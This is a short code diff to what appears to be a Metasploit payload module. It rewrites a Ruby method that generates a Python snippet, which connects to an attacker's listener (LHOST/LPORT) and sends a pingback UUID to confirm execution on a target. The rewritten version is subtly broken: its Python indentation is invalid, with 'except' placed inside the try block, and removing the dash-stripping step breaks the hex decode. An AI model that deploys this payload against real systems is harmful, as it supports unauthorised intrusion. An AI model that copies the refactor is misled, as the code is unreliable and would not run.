@@ -31,16 +31,17 @@ module MetasploitModule
   end
 
   def command_string
-    self.pingback_uuid ||= generate_pingback_uuid
+    self.pingback_uuid ||= self.generate_pingback_uuid
 
-    cmd = "import socket as s\n"
-    cmd << "so=s.socket(s.AF_INET,s.SOCK_STREAM)\n"
-    cmd << "try:\n"
-    cmd << " so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n"
-    cmd << " so.send('#{self.pingback_uuid.gsub('-', '')}'.decode('hex'))\n"
-    cmd << " so.close()\n"
-    cmd << "except:\n"
-    cmd << " pass\n"
-    cmd
+    cmd = <<~PYTHON
+      import socket as s
+        so=s.socket(s.AF_INET,s.SOCK_STREAM)
+        try:
+          so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
+          so.send('#{self.pingback_uuid}'.decode('hex'))
+          so.close()
+          except:
+        pass
+    PYTHON
   end
 end
